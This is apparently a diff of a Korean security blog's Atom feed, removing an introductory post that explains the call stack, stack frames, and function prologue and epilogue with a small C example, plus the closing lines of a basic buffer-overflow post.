-&lt;p&gt;CMD가 정상적으로 잘 실행되네요^^&lt;/p&gt;
-
-&lt;p&gt;지금까지 Direct EIP Overwrite에 대해서 알아봤습니다. 다음 연재에서는 메모리 보호 기법 중 하나인 ASLR의 개념과 우회 방법을 다루어보도록 하겠습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x03 Basic Bof</summary></entry><entry><title type="html">windows-0x02</title><link href="/windows-0x02" rel="alternate" type="text/html" title="windows-0x02" /><published>2019-02-18T19:18:00+09:00</published><updated>2019-02-18T19:18:00+09:00</updated><id>/windows-0x02</id><content type="html" xml:base="/windows-0x02">&lt;h1 id=&quot;0x02-stack&quot;&gt;0x02 STACK&lt;/h1&gt;
-
-&lt;h5 id=&quot;what-is-the-stack&quot;&gt;What is the STACK?&lt;/h5&gt;
-
-&lt;p&gt;STACK은 Main 함수를 포함한 각 함수들이 생성하는 &lt;strong&gt;지역변수&lt;/strong&gt;, &lt;strong&gt;결과값&lt;/strong&gt; 그리고 함수가 필요로 하는 &lt;strong&gt;인자&lt;/strong&gt;들을 저장할 수 있는 메모리 영역입니다.
-이 영역은 LIFO(Last In, First Out)이라는 데이터 구조를 가지고 있으며, CPU에 의해 관리되고 최적화되는 영역이기 때문에 데이터를 읽고 쓰는 속도가 매우 빠릅니다. 또한, 어떤 함수가 변수를 선언하면 그 새로운 변수는 스택에 생성되고(push), 함수가 종료될 때 함수가 생성한 모든 변수, 값등은 자동으로 해제됩니다.&lt;/p&gt;
-
-&lt;h5 id=&quot;how-does-the-stack-work&quot;&gt;How does the STACK work?&lt;/h5&gt;
-
-&lt;p&gt;STACK을 설명할 때 가장 먼저 떠오르는 개념이 바로 LIFO입니다. LIFO는 Last In First Out의 앞 글자를 딴 용어이고 한글로는 후입선출이라고 합니다.
-설명을 하자면 ‘마지막에 들어온 것이 먼저 나간다’이죠. 아래 그림을 보면서 설명을 이어나가겠습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x02_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-1]&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;STACK은 위 그림처럼 한 쪽이 막혀 있고 입구가 하나인 구조를 가지고 있습니다.&lt;/p&gt;
-
-&lt;p&gt;앞에서 제가 마지막에 들어온 것이 먼저 나간다라고 했는데, 들어오는 동작. 값을 STACK에 저장하는 동작을 &lt;strong&gt;push&lt;/strong&gt;라고 합니다.&lt;/p&gt;
-
-&lt;p&gt;반대로 나가는 동작. 값을 STACK에서 빼내는 동작을 &lt;strong&gt;pop&lt;/strong&gt;이라고 합니다. 이것이 STACK의 기본 구조이며 동작입니다.&lt;/p&gt;
-
-&lt;p&gt;그럼, 다음 코드를 가지고 STACK 동작 및 용어들을 조금 더 살펴보도록 하겠습니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
-
-void plus(int input) {
-	int output = input+2;
-	printf(&quot;Result : %d\n&quot;, output);
-}
-
-int main(int argc, char* argv[]) {
-	int a = 4;
-	plus(a);
-
-	return 0;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;위 코드는 입력 값에다 2를 더해서 출력해주는 간단한 내용입니다. 아래 [그림 1-1]은 plus 함수가 동작하고 있는 특정 순간의 STACK 상황을 표현한 내용입니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x02_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-2]&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;STACK은 STACK Frame들이 모여서 만들어진다고도 표현합니다. 풀어서 설명을 좀 해보자면, 각 함수들마다 주어진 동작을 위한 공간이 주어지는데 이런 공간 하나 하나를 STACK Frame이라고 할 수 있겠습니다. 이 공간들이 모여 STACK을 구성하는 것이죠.&lt;/p&gt;
-
-&lt;p&gt;위 그림의 오른편을 보면, Main Function STACK Frame이라고 적힌 것을 보실 수 있습니다. 
-그 아래로 Plus Function STACK Frame이라고 적혀 있죠.&lt;/p&gt;
-
-&lt;p&gt;위 그림처럼, 하나의 함수가 동작하는 중에 다른 함수가 동작되어지는 상황에서는 새롭게 실행되는 함수를 위한 공간을 마련합니다. 
-그리고나서 함수가 종료되면 마련해놓았던 공간을 해제합니다.&lt;/p&gt;
-
-&lt;p&gt;STACK은 Heap과는 다르게 여러분들이 직접 할당, 해제할 필요없이 자동으로 진행이 됩니다.&lt;/p&gt;
-
-&lt;p&gt;마지막으로, 함수가 실행되어 동작하는 과정에서 STACK에 값을 저장하거나, STACK의 값을 참조하는 등의 행동을 할 때는 Offset을 가지고 합니다.&lt;/p&gt;
-
-&lt;p&gt;그런데 이 Offset이라는 게 어떤 지점까지의 거리니까 기준점이 있어야겠죠? 그 기준점으로 주로 활용되는 것이 EBP와 ESP입니다.&lt;/p&gt;
-
-&lt;p&gt;새로운 함수를 위해 Frame을 구성하면 제일 먼저하는 동작. 함수의 프롤로그 과정이죠.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;push ebp
-mov ebp,esp
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;새로운 함수를 위해 Frame을 구성하면 제일 먼저 프롤로그 과정을 통해 기준점을 생성합니다. 이 기준점을 생성할 때는 아무 값이나 설정하는 것이 아니라
-이전 STACK Frame의 기준점을 가지고 옵니다.&lt;/p&gt;
-
-&lt;p&gt;그래서 STACK에 그림으로 표기할 때, EBP(Extended Base Pointer)라는 용어와 SFP(Saved Frame Pointer)라는 용어도 같이 사용하죠.&lt;/p&gt;
-
-&lt;p&gt;이전 STACK의 기준점을 가지고와서 현재 STACK Frame의 기준으로 쓰다가 함수가 종료되는 시점. 에필로그 과정에서 다시 되돌려 줍니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov esp, ebp
-pop ebp
-pop eip
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;이 과정을 통해 EBP를 원래대로 돌려줄 뿐만 아니라, 이전 Frame 안의 다음 주소로 이동하게 됩니다.
-Offset의 기준을 ESP로 잡더라도 EBP를 새로운 STACK Frame에 구성하는 행위는 변함없습니다.&lt;/p&gt;
-
-&lt;p&gt;아래는 지금까지 설명한 내용들을 정리한 내용들입니다.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;SFP&lt;/strong&gt;&lt;/p&gt;
-
-    &lt;p&gt;-Saved Frame Pointer는 현재 STACK Frame의 지역 변수들을 위한 기준점 역할을 합니다.&lt;/p&gt;
-
-    &lt;p&gt;-예전 STACK Frame이 가지고 있던 EBP가 현재 STACK Frame의 EBP(Extended Base Pointer)에 저장됩니다.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;함수 호출&lt;/strong&gt;&lt;/p&gt;
-
-    &lt;p&gt;-함수가 호출되면, 새로운 STACK Frame이 생성됩니다.&lt;/p&gt;
-
-    &lt;p&gt;-함수 동작에 필요한 인자들을 STACK에 저장합니다.&lt;/p&gt;
-
-    &lt;p&gt;-현재 EBP와 Return Address가 저장됩니다.&lt;/p&gt;
-
-    &lt;p&gt;-ESP는 새로운 STACK Frame에 맞추어 변경됩니다.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;함수 종료&lt;/strong&gt;&lt;/p&gt;
-
-    &lt;p&gt;-함수 사용에 필요했던 STACK Frame이 제거됩니다.&lt;/p&gt;
-
-    &lt;p&gt;-EBP가 이전에 저장했뒀던 값으로 되돌려지고, Return Address로 코드의 흐름이 바뀝니다.&lt;/p&gt;
-
-    &lt;p&gt;-ESP는 되돌아온 STACK Frame에 맞추어 변경됩니다.&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;STACK에 대한 이야기는 이쯤해두고, 다음 연재부터는 본격적으로 Stack based overflow를 다루어보겠습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x02 STACK</summary></entry></feed>
+&lt;strong&gt;뿅&lt;/strong&gt;!&lt;/p&gt;</content><author><name>Sulla</name></author><category term="Posts" /><summary type="html">0x03 - Basic BOF &amp;amp; 메모리 보호 기법</summary></entry></feed>
